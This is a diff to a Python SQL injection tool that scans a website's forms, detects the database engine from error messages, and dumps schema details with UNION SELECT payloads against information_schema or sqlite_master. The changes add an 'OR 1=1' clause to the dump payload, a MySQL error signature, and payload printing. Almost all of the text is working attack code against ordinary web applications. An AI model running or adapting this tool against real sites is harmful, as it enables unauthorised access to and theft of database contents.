@@ -6,8 +6,8 @@ from urllib.parse import urlencode
 import requests
 from utils import get_all_forms, get_form_details, diff_html
 
-parser = argparse.ArgumentParser(description="Perform ARP poisoning on a target")
-parser.add_argument("url", help="The URL of the website to test for sqli")
+parser = argparse.ArgumentParser(description="Perform sqli detection on a website")
+parser.add_argument("url", help="URL of the website to scan")
 parser.add_argument("-X", type=str, default="GET", metavar="METHOD", help="Enter the method")
 # parser.add_argument("o", help="Enter the output of archive file")
 
@@ -16,7 +16,7 @@ entrypoints = [ "'", "\"", "`", "')", "\")", "`)", "'))", "\"))", "`))"]
 
 tables = {
 	"sqlite": "FROM sqlite_master",
-	"mysql": "FROM information_schema.tables", 
+	"mysql": "FROM information_schema.columns", 
 }
 infos = {
 	"sqlite": ["name", "sql"], # sql for colums, name for tables
@@ -43,7 +43,7 @@ def make_request(injectable_input, form_details, payload, method):
 
 def detect_error(diff):
 	errors = {
-		"mysql": ["You have an error in your SQL syntax", "Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in"],
+		"mysql": ["You have an error in your SQL syntax", "Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in", "Uncaught mysqli_sql_exception"],
 		"sqlite": ["SQLite3::query(): Unable to prepare statement"], 
 		"postgresql": ["PostgreSQL query failed: ERROR: syntax error at or near"],
 		"mssql": ["Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark after the character string"], 
@@ -92,7 +92,9 @@ def dump_database(input, working, form_details, nb_columns, engine):
 	while count < nb_columns:
 		insert += ",NULL"
 		count += 1
-	res = make_request(input, form_details, f"{working} UNION SELECT {insert} {tables[engine]} {comments[engine]}", "POST")
+	payload = f"{working} OR 1=1 UNION SELECT {insert} {tables[engine]} {comments[engine]}"
+	print("PAYLOAD USED: ", payload)
+	res = make_request(input, form_details, payload, args.X)
 	diff = diff_html(page.text.splitlines(keepends=True), res.text.splitlines(keepends=True))
 	return diff
 
@@ -114,7 +116,6 @@ if __name__ == "__main__":
 			exit(0)
 		for payload in payload_working:
 			columns = detect_number_of_columns(payload[2], form_details, payload[1], payload[0],args.X)
-			print("PAYLOAD USED: ", payload[1])
 			print("VULNERABLE PARAMETER: ", payload[2])
 			print("ENGINE: ", payload[0])
 			print("DATABASE INFOS: ", dump_database(payload[2], payload[1], form_details, columns, payload[0]))
